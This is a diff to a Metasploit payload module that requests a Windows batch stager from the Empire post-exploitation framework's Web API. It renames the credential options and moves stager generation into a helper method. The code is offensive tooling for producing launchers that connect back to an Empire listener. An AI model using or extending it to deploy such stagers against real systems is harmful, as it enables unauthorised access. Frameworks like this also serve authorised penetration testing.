@@ -31,12 +31,12 @@ module MetasploitModule
       [
 
       OptString.new(
-        'USERNAME',
+        'EmpireUser',
         [true,
         'Username for Empire Web-API'
         ]),
       OptString.new(
-        'PASSWORD',
+        'EmpirePass',
         [true,
         'Password for Empire Web-API'
         ]),
@@ -58,12 +58,17 @@ module MetasploitModule
     ])
   end
 
+  def stagerGenerator(empireClient)
+    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_bat')
+    return @stagerCode
+  end
+
   def generate
     #
     #Storing data from user
     #
-    @empire_username = datastore['USERNAME'].to_s
-    @empire_password = datastore['PASSWORD'].to_s
+    @empire_username = datastore['EmpireUser'].to_s
+    @empire_password = datastore['EmpirePass'].to_s
     if @empire_username.empty?
       return ""
     end
@@ -107,8 +112,8 @@ module MetasploitModule
     end
     #
     #Generating payload
+    #check the persistence of objects through out the method
     #
-    @stagerCode = client_emp.gen_stager(@listener_name, 'windows/launcher_bat')
-    return @stagerCode
+    return stagerGenerator(client_emp)
   end
 end
